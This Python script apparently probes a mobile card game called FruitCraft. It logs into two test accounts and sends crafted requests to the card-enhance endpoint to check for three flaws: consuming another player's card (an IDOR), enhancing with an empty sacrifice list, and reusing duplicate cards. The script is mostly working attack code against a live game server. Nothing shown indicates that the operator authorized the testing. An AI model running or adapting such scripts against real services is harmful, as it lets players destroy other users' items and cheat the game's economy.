import sys, os
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def main():
    print("Testing structural vulnerabilities...")
    c1 = FruitClient()
    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1"))
    if not s1:
        print("Login T1 failed")
        return

    c2 = FruitClient()
    s2, d2 = c2.login(os.environ.get("TEST_ACC_2_KEY", "REDACTED_KEY_2"), os.environ.get("TEST_ACC_2_UDID", "REDACTED_UDID_2"))
    if not s2:
        print("Login T2 failed")
        return

    c1_cards = d1.get("data", {}).get("cards", [])
    c2_cards = d2.get("data", {}).get("cards", [])

    if len(c1_cards) < 2 or len(c2_cards) < 1:
        print("Need at least 2 cards on T1 and 1 card on T2 to test.")
        # Attempt to buy cards if missing
        if len(c1_cards) < 2:
            print("Buying cards for T1...")
            c1.buy_card_pack(1) # cheapest pack
        if len(c2_cards) < 1:
            print("Buying cards for T2...")
            c2.buy_card_pack(1)
        # re-fetch
        d1 = c1.get_profile()
        d2 = c2.get_profile()
        c1_cards = d1.get("data", {}).get("cards", [])
        c2_cards = d2.get("data", {}).get("cards", [])
        
    if len(c1_cards) < 2 or len(c2_cards) < 1:
        print("Still don't have enough cards.")
        return

    c1_target = c1_cards[0]["id"]
    c1_sac = c1_cards[1]["id"]
    c2_sac = c2_cards[0]["id"]

    print(f"\n--- 1. Testing Cross-Account Sacrifice (IDOR) ---")
    print(f"Enhancing T1 Card ({c1_target}) with T2 Card ({c2_sac})...")
    payload = {"card_id": c1_target, "sacrifices": json.dumps([c2_sac])}
    res = c1.post("/cards/enhance", payload)
    if res and res.get("status"):
        print("[!] VULNERABLE! Successfully consumed another player's card.")
    elif res and res.get("raw_html"):
        print("[-] Crashed (HTML) - likely unhandled exception.")
    else:
        print("[-] PATCHED or rejected:", res)

    time.sleep(2)

    print(f"\n--- 2. Testing Empty Array Validation ---")
    payload = {"card_id": c1_target, "sacrifices": "[]"}
    res = c1.post("/cards/enhance", payload)
    if res and res.get("status"):
        print("[!] VULNERABLE! Enhanced with empty array.")
    elif res and res.get("raw_html"):
        print("[-] Crashed (HTML) - empty array causes Zend failure.")
    else:
        print("[-] PATCHED or rejected:", res)

    time.sleep(2)

    print(f"\n--- 3. Testing Duplicate Sacrifices ---")
    payload = {"card_id": c1_target, "sacrifices": json.dumps([c1_sac, c1_sac])}
    res = c1.post("/cards/enhance", payload)
    if res and res.get("status"):
        print("[!] VULNERABLE! Accepted duplicate cards in sacrifice list.")
    elif res and res.get("raw_html"):
        print("[-] Crashed (HTML)")
    else:
        print("[-] PATCHED or rejected:", res)

if __name__ == "__main__":
    main()
